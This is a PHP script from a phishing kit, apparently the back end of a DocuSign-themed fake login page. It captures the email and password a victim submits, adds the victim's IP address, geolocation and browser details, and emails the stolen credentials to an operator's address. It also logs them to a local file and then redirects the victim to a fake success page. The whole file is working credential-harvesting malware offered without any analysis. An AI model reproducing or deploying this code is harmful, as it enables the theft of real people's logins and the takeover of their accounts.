<?php 
if (isset($_POST['passwd'])) { 

include('./mail.php');
require_once('geoplugin.class.php');
require_once('browser.php');
$browser = new Wolfcast\BrowserDetection();
$browser->setUserAgent($_SERVER['HTTP_USER_AGENT']);
$adddate=date("D M d, Y g:i a");

$geoplugin = new geoPlugin();

//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "\n========+ Logins +========\n";

$message .= "| Email: >> [+ " .$_POST['login']. " +]\n"; 
$message .= "| Password: >> [+ " . $_POST['passwd'] . " +]\n"; 
$message .= "| IP: >> [-" .$ip. "-]\n"; 
$message .= "| Date & Time: >> [+ ".$adddate." +] \n";
$message .= "==========+ LOCATION +==========\n";
$message .= "| City: >> [+ {$geoplugin->city} +]\n";
$message .= "| Region: >> [+ {$geoplugin->region} +]\n";
$message .= "| Country Name: >> [+ {$geoplugin->countryName} +]\n";
$message .= "| Country Code: >> [+ {$geoplugin->countryCode} +]\n";
$message .= $browser;
$message .= "========+ CR34T3D BY Kalisheen +========\n";

$headers = "From: Smart {$geoplugin->countryCode} Alert+ <noreply>";
$headers .= $_POST['smart@docusign.com']."\n";

$login = $_POST['login'];

$hi = mail($to,$emailprovider."{$geoplugin->countryName} | ".$ip , $message,$headers); 

$ret = file_put_contents('./error_logs.txt', $message, FILE_APPEND | LOCK_EX);

// if (!isset($_COOKIE['smartback']))
// {
// setcookie("smartback", "no");
// header("Location: index.php?userid=$login");
// }
// else{

header("Location: success.php?l=sJidXdidIYnMxmwofLodmAkNOu&eM&HosYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIY&cmd=login_submit&id=&userid=$login");
}
?>
